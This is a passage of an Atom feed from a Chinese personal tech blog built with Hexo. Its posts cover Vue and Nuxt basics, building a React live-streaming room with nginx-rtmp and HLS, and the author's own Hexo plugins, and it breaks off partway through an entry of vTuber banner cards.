<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>集合</title>
  
  <subtitle>万物终归一站</subtitle>
  <link href="https://mimonarchrd.gitee.io/atom.xml" rel="self"/>
  
  <link href="https://mimonarchrd.gitee.io/"/>
  <updated>2022-10-10T08:43:34.275Z</updated>
  <id>https://mimonarchrd.gitee.io/</id>
  
  <author>
    <name>[object Object]</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Nuxt</title>
    <link href="https://mimonarchrd.gitee.io/2022/08/02/Nuxt/"/>
    <id>https://mimonarchrd.gitee.io/2022/08/02/Nuxt/</id>
    <published>2022-08-02T06:58:21.000Z</published>
    <updated>2022-10-10T08:43:34.275Z</updated>
    
    <content type="html"><![CDATA[<p>vue 的一个框架，使用 vue2。</p><h3 id="项目结构："><a href="#项目结构：" class="headerlink" title="项目结构："></a>项目结构：</h3><h4 id="pages-文件夹"><a href="#pages-文件夹" class="headerlink" title="pages 文件夹"></a>pages 文件夹</h4><p>整个 nuxt 项目的所有页面和路由，定义在这个文件夹下的<code>文件夹/文件.vue</code>都会自动的添加对应的路由。<code>xxx/yyy.vue</code>访问 host/xxx/yyy 即可</p><h4 id="components-文件夹"><a href="#components-文件夹" class="headerlink" title="components 文件夹"></a>components 文件夹</h4><p>和 vue-cli 创建的 vue 项目中的文件夹有差不多的作用，相当于公共组件，会被自动<code>import</code>到 pages 下的每一个 vue 文件中</p><h4 id="assets-文件夹"><a href="#assets-文件夹" class="headerlink" title="assets 文件夹"></a>assets 文件夹</h4><p>不用编译的静态资源文件，css、img、font 等</p><h4 id="static-文件夹"><a href="#static-文件夹" class="headerlink" title="static 文件夹"></a>static 文件夹</h4><p>映射项目根目录的文件夹（打包完成后的），favicon.ico 存放的那个文件夹</p><h4 id="layouts-文件夹"><a href="#layouts-文件夹" class="headerlink" title="layouts 文件夹"></a>layouts 文件夹</h4><p>布局组件，里面提供<code>&lt;Nuxt /&gt;</code>相当于插槽，可以嵌入 pages 组件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;vue 的一个框架，使用 vue2。&lt;/p&gt;
&lt;h3 id=&quot;项目结构：&quot;&gt;&lt;a href=&quot;#项目结构：&quot; class=&quot;headerlink&quot; title=&quot;项目结构：&quot;&gt;&lt;/a&gt;项目结构：&lt;/h3&gt;&lt;h4 id=&quot;pages-文件夹&quot;&gt;&lt;a href=&quot;#pages-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ref、props、mixin、插件、scoped</title>
    <link href="https://mimonarchrd.gitee.io/2022/05/26/ref%E3%80%81props%E3%80%81mixin%E3%80%81%E6%8F%92%E4%BB%B6%E3%80%81scoped/"/>
    <id>https://mimonarchrd.gitee.io/2022/05/26/ref%E3%80%81props%E3%80%81mixin%E3%80%81%E6%8F%92%E4%BB%B6%E3%80%81scoped/</id>
    <published>2022-05-26T12:27:01.000Z</published>
    <updated>2022-10-10T08:43:34.276Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ref-属性"><a href="#ref-属性" class="headerlink" title="ref 属性"></a>ref 属性</h3><p>引用，和 react 的 ref 差不多，都是为了避免原生的 DOM 操作，给子组件注册引用信息。<br>普通的 html 标签上的<code>ref</code>指向的是这个 DOM 元素，普通的组件的<code>ref</code>属性指向的这个组件的实例对象</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-text</span>=<span class="string">&quot;msg&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">ref</span>=<span class="string">&quot;btn&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showDOM&quot;</span>&gt;</span>点我输出上方的DOM元素<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">School</span> <span class="attr">ref</span>=<span class="string">&quot;sch&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;App&quot;</span>,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">showDOM</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">title</span>); <span class="comment">//真实DOM元素</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">btn</span>); <span class="comment">//真实DOM元素</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">sch</span>); <span class="comment">//School组件的实例对象（vc）</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="props-属性"><a href="#props-属性" class="headerlink" title="props 属性"></a>props 属性</h3><p>类似 react 的 props 属性，都是接受父组件传递的值。接收的方式有下面的三种</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单声明接收</span></span><br><span class="line"><span class="attr">props</span>:[<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收的同时对数据进行类型限制</span></span><br><span class="line"><span class="attr">props</span>:&#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">age</span>:<span class="title class_">Number</span>,</span><br><span class="line">      <span class="attr">sex</span>:<span class="title class_">String</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收的同时对数据：进行类型限制+默认值的指定+必要性的限制</span></span><br><span class="line"><span class="attr">props</span>:&#123;</span><br><span class="line">  <span class="attr">name</span>:&#123;</span><br><span class="line">    <span class="attr">type</span>:<span class="title class_">String</span>, <span class="comment">//name的类型是字符串</span></span><br><span class="line">      <span class="attr">required</span>:<span class="literal">true</span>, <span class="comment">//name是必要的</span></span><br><span class="line">  &#125;,</span><br><span class="line">    <span class="attr">age</span>:&#123;</span><br><span class="line">      <span class="attr">type</span>:<span class="title class_">Number</span>,</span><br><span class="line">        <span class="attr">default</span>:<span class="number">99</span> <span class="comment">//默认值</span></span><br><span class="line">    &#125;,</span><br><span class="line">      <span class="attr">sex</span>:&#123;</span><br><span class="line">        <span class="attr">type</span>:<span class="title class_">String</span>,</span><br><span class="line">          <span class="attr">required</span>:<span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，传入子组件的 prop 属性，都是直接放到了子组件的身上，但是没有放到<code>_data</code>下。可以直接使用<code>this.xx</code>来使用。react 中是放到了组件的 props 属性下，使用的时候要<code>this.props.xxx</code></p><h3 id="mixin-属性"><a href="#mixin-属性" class="headerlink" title="mixin 属性"></a>mixin 属性</h3><p>混合属性，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个混入对象</span></span><br><span class="line"><span class="keyword">var</span> myMixin = &#123;</span><br><span class="line">  <span class="attr">created</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">hello</span>();</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="attr">hello</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello from mixin!&quot;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个使用混入对象的组件</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Component</span> = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">  <span class="attr">mixins</span>: [myMixin],</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> component = <span class="keyword">new</span> <span class="title class_">Component</span>(); <span class="comment">// =&gt; &quot;hello from mixin!&quot;</span></span><br></pre></td></tr></table></figure><p>如果混入对象中的配置对象和组件本身的属性重名了，那么先使用组件身上的配置对象<br>但是，如果混入对象上配置的是生命周期，那么组件的生命周期和混入对象配置的生命周期都会执行</p><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>通常用来为 Vue 添加全局功能（增强功能）<br>比如可以在插件中添加一个<code>mixin</code>混入，里面配置一个<code>data</code>下面有<code>abc</code>。这样，vue 中的每一个组件都有了这个<code>abc</code>属性<br>再比如，可以添加一个过滤属性，里面做一些数据的操作，比如<code>a+b</code>。这样所有的 vue 组件都可以使用这个过滤器了</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用 `MyPlugin.install(Vue)` 要在new Vue()之前使用</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">MyPlugin</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="comment">// ...组件选项</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>插件的定义：<br>插件必须要实现<code>install</code>方法，默认接收两个参数，第一个方法就是<code>Vue</code>构造器，第二个参数是一个可选择的对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">install</span>(<span class="params">Vue, options</span>) &#123;</span><br><span class="line">    <span class="comment">//定义混入</span></span><br><span class="line">    <span class="title class_">Vue</span>.<span class="title function_">mixin</span>(&#123;</span><br><span class="line">      <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          <span class="attr">option</span>: &#123; <span class="attr">a</span>: <span class="number">100</span>, <span class="attr">b</span>: <span class="number">200</span> &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//给Vue原型上添加一个方法,vm(vue实例对象)和vc(vuecomponent实例对象)就都能用了</span></span><br><span class="line">    <span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hello</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&quot;你好啊&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="scoped"><a href="#scoped" class="headerlink" title="scoped"></a>scoped</h3><p>可以限定住组件的样式范围，让其仅在当前组件中生效 (写样式很常用)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;ref-属性&quot;&gt;&lt;a href=&quot;#ref-属性&quot; class=&quot;headerlink&quot; title=&quot;ref 属性&quot;&gt;&lt;/a&gt;ref 属性&lt;/h3&gt;&lt;p&gt;引用，和 react 的 ref 差不多，都是为了避免原生的 DOM 操作，给子组件注册引用信息。&lt;br&gt;普</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>React直播间的开发</title>
    <link href="https://mimonarchrd.gitee.io/2021/11/21/react%E7%9B%B4%E6%92%AD%E9%97%B4%E7%9A%84%E5%BC%80%E5%8F%91/"/>
    <id>https://mimonarchrd.gitee.io/2021/11/21/react%E7%9B%B4%E6%92%AD%E9%97%B4%E7%9A%84%E5%BC%80%E5%8F%91/</id>
    <published>2021-11-21T04:22:39.000Z</published>
    <updated>2022-04-30T03:15:12.925Z</updated>
    
    <content type="html"><![CDATA[<p>直播-流媒体。整个项目是19年4-5月份完成的，20年2月疫情期间做了新ui。最近这几天加了SuperChat功能</p><ul><li>  <a href="https://mimonarchrd.gitee.io/liveroom" title="在线Demo">在线Demo</a><span id="more"></span>这算是自己兴趣使然的第一个项目。17年写过一点小程序，但是那会儿对于前端的知识掌握的太少，直接用腾讯的框架很多东西都不懂的</li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>  最早了解的直播是red5，red5可以直接搭建一个直播服务器，但是版本都很老了，后面的版本不开源。rtmp和hls，rtmp是常用的流协议，但不支持手机播放。因此，选择了nginx-rtmp-module模块，这个模块接收rtmp推流，推流可以选择使用obs或者ffmpeg。这个模块还提供对应的应用，比如hls支持，dash支持。可以将rtmp流变为hls，hls是通过http协议来拿到ts流切片的，现在的H5播放器（videojs）等一些封装好的播放器都支持。videojs拿到m3u8文件可以自动找到服务器或者客户端拿到的ts文件，非常的方便。且对于手机和PC都有很好的支持。</li><li>直播间=互动+直播视频，最基本的两个功能。额外还有在线人数统计，还有醒目留言SC功能。20年更新的版本还可以换直播间的推流源，在线更改直播间标题和待机背景<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2>  基本的思路明确后，服务器的nginx安装和安装nginx-rtmp-module模块都不是什么问题。</li><li>  <a href="https://github.com/arut/nginx-rtmp-module" title="nginx-rtmp-module">nginx-rtmp-module下载</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">path/to/nginx/configuer --add-module=/path/to/nginx-rtmp-module   // 编译安装</span><br><span class="line">make</span><br><span class="line">install</span><br></pre></td></tr></table></figure><p>nginx的配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rtmp&#123;                                   <span class="comment"># 添加一个rtmp块</span></span><br><span class="line">    server&#123;                             <span class="comment"># rtmp推流端口</span></span><br><span class="line">        listen 1935;</span><br><span class="line">        chunk_size 4000;</span><br><span class="line">    application hls&#123;                    <span class="comment"># hls应用块</span></span><br><span class="line">        hls on;</span><br><span class="line">        hls_path /path/to/hls/abcd;     <span class="comment"># hls的文件存放位置</span></span><br><span class="line">        live on;</span><br><span class="line">        record off;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="直播间结构"><a href="#直播间结构" class="headerlink" title="直播间结构"></a>直播间结构</h2><ul><li>  播放器组件</li><li>  标题组件</li><li>  聊天内容组件</li><li>  发送聊天组件</li><li>  服务器通讯组件</li><li>  在线人数显示组件</li></ul><p>简单说为上面这些组件构成，但一些组件下又追加了一些其他组件。这里不给出了</p><h2 id="遇到的一些问题"><a href="#遇到的一些问题" class="headerlink" title="遇到的一些问题"></a>遇到的一些问题</h2><h4 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h4><p>当时使用bootstrap3作为布局框架，栅格布局。现在来看，这种布局方式不灵活，调整布局需要到html文件下。理论上应该是在组件中调整布局的方式，以App组件来加载其他组件最后挂载App组件到html的一个定义好的dom上去。调整布局仅调整App组件即可</p><h4 id="实时聊天"><a href="#实时聊天" class="headerlink" title="实时聊天"></a>实时聊天</h4><p>多人同时聊天需要一份共享的聊天数据，或者说有新聊天内容都要同步给所有参与聊天的人。这里使用了socketio，做了长连接。会话时间为进入直播间到关掉直播间页面。整个聊天数据都是在服务端处理的，比如新消息的下发，在线人数等</p><h4 id="冗余数据处理"><a href="#冗余数据处理" class="headerlink" title="冗余数据处理"></a>冗余数据处理</h4><p>这一块在现在的项目中还没有优化，下发新的聊天数据应该是最新的一条数据。现在是下发给每一个连接的客户端所有的数据，之后react会做虚拟dom的对比仅更新最新一条的dom</p><h4 id="推流源换源、换海报、配置直播标题"><a href="#推流源换源、换海报、配置直播标题" class="headerlink" title="推流源换源、换海报、配置直播标题"></a>推流源换源、换海报、配置直播标题</h4><p>因为这些配置一般为直播up配置，但直播间没有权限划分、用户认证。故想到了使用路由开发隐藏页面（不直接提供入口）也就是README中提到的<code>/backstage</code>后台</p><h4 id="hls延迟"><a href="#hls延迟" class="headerlink" title="hls延迟"></a>hls延迟</h4><p>hls是因为原理为加载切片，不为完整流有延迟。这点只能二次开发videojs或者使用其他协议，暂时没有计划</p><h2 id="直播间的历程（同步README）"><a href="#直播间的历程（同步README）" class="headerlink" title="直播间的历程（同步README）"></a>直播间的历程（同步README）</h2><h3 id="直播间1-0"><a href="#直播间1-0" class="headerlink" title="直播间1.0"></a>直播间1.0</h3><blockquote><p>当时正是Ultra2019的时候，为了给无法看Y2B的小伙伴云蹦迪的乐趣，想到了直播。不能用其他平台直播境外的东西，所以就自己用Red5和videojs5.x的版本弄了一个简易的网页。</p></blockquote><p><img src="https://static.xiaoblogs.cn/img/liveroomv1.png"></p><h3 id="直播间2-0"><a href="#直播间2-0" class="headerlink" title="直播间2.0"></a>直播间2.0</h3><blockquote><p>直播间1.0的最大问题就是rtmp推流只能用flash播放，手机不支持，没法在手机上看。之后正巧学习了React框架就索性用了这个框架。播放器啊、聊天框啊都是用的<a href="https://ant.design/docs/react/introduce-cn">Ant Design</a>第三方的UI组件库。播放器是<a href="https://www.npmjs.com/package/react-flow-player">FlowPlayer</a>是H5的播放器，也就用HLS推流了。之后就一直没有了更新。直到2020年的这个多灾多难的假期，有了时间准备更新下直播间。受不了2.0的圆角设计和UI了，索性发布3.0</p></blockquote><p><img src="https://static.xiaoblogs.cn/img/liveroomv2.png"></p><h3 id="直播间3-0"><a href="#直播间3-0" class="headerlink" title="直播间3.0"></a>直播间3.0</h3><blockquote><p>直播间3.0全新设计了UI，我使用的是Balsamiq Wireframes 4，在liveroom_design的文件夹里面有设计样式图片。本来打算是重新重做直播间，其实说到也算是。参考设计是Y2B。做完了UI并且实现了逻辑后发现直播间的标题和播放器海报，直播源不能更改。后面又想到了用前端的另一个页面直接可以对这些元素修改。到最后终于做完啦，开始直播喽！</p></blockquote><p><img src="https://static.xiaoblogs.cn/img/liveroomv3.png"></p><h2 id="一点点感想"><a href="#一点点感想" class="headerlink" title="一点点感想"></a>一点点感想</h2><p>其实花的时间不久，多数的时间不是在编码，而是在解决遇到的问题。或者是权衡用什么方式实现最好。还有的时间在研究react，尤其是第二版的直播间，完全是边学边做。其实还有好多的功能没有添加，比如弹幕。最大的感触倒不是编码多牛了，而是比如以前太单纯考虑问题；弹幕仅考虑发送和显示，现在在此基础上考虑弹幕的显示是按照直播时间来显示，什么时候进来就从什么时候开始，显示以此时间开始后的弹幕。弹幕的记忆功能。考虑问题更多了罢。知识是学不完的，多练多尝试多学习。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;直播-流媒体。整个项目是19年4-5月份完成的，20年2月疫情期间做了新ui。最近这几天加了SuperChat功能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;  &lt;a href=&quot;https://mimonarchrd.gitee.io/liveroom&quot; title=&quot;在线Demo&quot;&gt;在线Demo&lt;/a&gt;</summary>
    
    
    
    <category term="react" scheme="https://mimonarchrd.gitee.io/categories/react/"/>
    
    
  </entry>
  
  <entry>
    <title>ncm网易云小插件发布</title>
    <link href="https://mimonarchrd.gitee.io/2021/11/20/ncm%E7%BD%91%E6%98%93%E4%BA%91%E5%B0%8F%E6%8F%92%E4%BB%B6%E5%8F%91%E5%B8%83/"/>
    <id>https://mimonarchrd.gitee.io/2021/11/20/ncm%E7%BD%91%E6%98%93%E4%BA%91%E5%B0%8F%E6%8F%92%E4%BB%B6%E5%8F%91%E5%B8%83/</id>
    <published>2021-11-20T01:22:58.000Z</published>
    <updated>2022-04-30T03:15:12.927Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://img.shields.io/npm/v/hexo-ncm-widget?style=flat-square" alt="npm"></p><p>为了拓展博客的小组件，且边看博客边听歌。完成了一个网易云音乐小组件</p><p>在侧边栏可以看到</p><p>完成这个组件有两点</p><ul><li>  获取数据</li><li>  使用获取的数据</li></ul><p>获取数据使用的fetch，异步。因为hexo渲染页面在渲染post之前，所以不能将获取数据放到挂载的钩子下。因此只能异步获取数据并写入到一个json文件，使用的时候直接同步读取这个json文件</p><p>使用数据则为dom的相关操作。</p><p>网易云的资源会禁止同一个IP多次的访问，因此资源的地址也不断的变化。只能多使用<code>hexo g</code>来更新资源地址了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://img.shields.io/npm/v/hexo-ncm-widget?style=flat-square&quot; alt=&quot;npm&quot;&gt;&lt;/p&gt;
&lt;p&gt;为了拓展博客的小组件，且边看博客边听歌。完成了一个网易云音乐小组件&lt;/p&gt;
&lt;p&gt;在侧边栏</summary>
      
    
    
    
    <category term="hexo" scheme="https://mimonarchrd.gitee.io/categories/hexo/"/>
    
    <category term="hexo插件" scheme="https://mimonarchrd.gitee.io/categories/hexo%E6%8F%92%E4%BB%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>vBanner插件发布</title>
    <link href="https://mimonarchrd.gitee.io/2021/09/10/vBanner%E6%8F%92%E4%BB%B6%E5%8F%91%E5%B8%83/"/>
    <id>https://mimonarchrd.gitee.io/2021/09/10/vBanner%E6%8F%92%E4%BB%B6%E5%8F%91%E5%B8%83/</id>
    <published>2021-09-10T06:43:18.000Z</published>
    <updated>2021-09-17T01:31:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>完成了一个hexo的美化插件，可以添加4:1比例的图片，给这个插件使用</p><p><img src="https://img.shields.io/npm/v/hexo-vtuber-banner" alt="npm"><img src="https://img.shields.io/github/package-json/v/MIMONATCH/hexo-vtuber-banner" alt="Github"></p><div id="vBanner_Root">    <div id="vBanner_Container" style="background-image: linear-gradient(to bottom right, white ,#FDC888)">        <a href="https://www.pixiv.net/artworks/88263776">            <div id="vBanner_post" title="艾露露Ailurus" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/88263776_p01.png)"></div>        </a>        <div id="vLogo_Container">                                               <div id="vBanner_logo" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/%E8%89%BE%E9%9C%B2%E9%9C%B2%EF%BC%88logo%EF%BC%89.png)"></div>                                             </div>    </div></div><span id="more"></span><p>效果如上图所示，已经发布到了npm</p><p>可以直接用安装npm包命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-vtuber-banner</span><br></pre></td></tr></table></figure><p>支持Hexo 3.0以上的版本</p><p>默认的banner的页面注入位置为<code>&lt;header&gt;&lt;/header&gt;</code>标签之中，默认会注入到Hexo的所有页面之中。可以配置默认注入的页面</p><p>国内可访问<a href="https://gitee.com/mimonarchrd/hexo-vtuber-banner">gitee仓库</a></p><p>如果你觉得还不错，请给我一个小星星吧！</p><p><a href="https://github.com/MIMONATCH/hexo-vtuber-banner"><img src="https://img.shields.io/github/stars/MIMONATCH/hexo-vtuber-banner?style=social"></a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;完成了一个hexo的美化插件，可以添加4:1比例的图片，给这个插件使用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.shields.io/npm/v/hexo-vtuber-banner&quot; alt=&quot;npm&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/package-json/v/MIMONATCH/hexo-vtuber-banner&quot; alt=&quot;Github&quot;&gt;&lt;/p&gt;
&lt;div id=&quot;vBanner_Root&quot;&gt;
    &lt;div id=&quot;vBanner_Container&quot; style=&quot;background-image: linear-gradient(to bottom right, white ,#FDC888)&quot;&gt;
        &lt;a href=&quot;https://www.pixiv.net/artworks/88263776&quot;&gt;
            &lt;div id=&quot;vBanner_post&quot; title=&quot;艾露露Ailurus&quot; style=&quot;background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/88263776_p01.png)&quot;&gt;&lt;/div&gt;
        &lt;/a&gt;
        &lt;div id=&quot;vLogo_Container&quot;&gt;
            
                
                   &lt;div id=&quot;vBanner_logo&quot; style=&quot;background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/%E8%89%BE%E9%9C%B2%E9%9C%B2%EF%BC%88logo%EF%BC%89.png)&quot;&gt;&lt;/div&gt;     
                    
            
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;</summary>
    
    
    
    
    <category term="hexo插件" scheme="https://mimonarchrd.gitee.io/tags/hexo%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>vTuber/vup 卡片展示demo</title>
    <link href="https://mimonarchrd.gitee.io/2021/09/08/vTuber-demo/"/>
    <id>https://mimonarchrd.gitee.io/2021/09/08/vTuber-demo/</id>
    <published>2021-09-08T14:01:26.000Z</published>
    <updated>2021-09-17T01:29:44.000Z</updated>
    
    <content type="html"><![CDATA[<div id="vBanner_Root">    <div id="vBanner_Container" style="background-image: linear-gradient(to bottom right, white ,#EE4F87)">        <a href="//www.deviantart.com/h4nip/art/Kizuna-Ai-GFX-Candy-Style-880025687">            <div id="vBanner_post" title="Kizuna AI" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/kizuna_ai__4k_uhd__by_assassinwarrior_dchk1rb.png)"></div>        </a>        <div id="vLogo_Container">                                               <div id="vBanner_logo" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/Logo_kizunaai_tp.png)"></div>                                             </div>    </div></div><span id="more"></span><div id="vBanner_Root">    <div id="vBanner_Container" style="background-image: linear-gradient(to bottom right, white ,#d03028)">        <a href="//wallhaven.cc/w/ym8mkg">            <div id="vBanner_post" title="辉夜月" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/wallhaven-ym8g.png)"></div>        </a>        <div id="vLogo_Container">                                               <div id="vBanner_logo" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/80px-Kaguya_Luna_Tricolor_Cross.png)"></div>                                             </div>    </div></div><div id="vBanner_Root">    <div id="vBanner_Container" style="background-image: linear-gradient(to bottom right, white ,#42D4FF)">        <a href="//www.deviantart.com/lucidkarn/art/Light-of-the-Future-727647269">            <div id="vBanner_post" title="未來明" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/dc18085-4e05dabf-319c-4a15-aa20-03c6b.png)"></div>        </a>        <div id="vLogo_Container">                            <div id="vBanner_name">未來明</div>                    </div>    </div></div><div id="vBanner_Root">    <div id="vBanner_Container" style="background-image: linear-gradient(to bottom right, white ,#C1D5DE)">        <a href="https://www.pixiv.net/artworks/66536566">            <div id="vBanner_post" title="Siro" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/66536566_p01.png)"></div>        </a>        <div id="vLogo_Container">                            <div id="vBanner_name">Siro</div>                    </div>    </div></div><div id="vBanner_Root">    <div id="vBanner_Container" style="background-image: linear-gradient(to bottom right, white ,#FEE9A8)">        <a 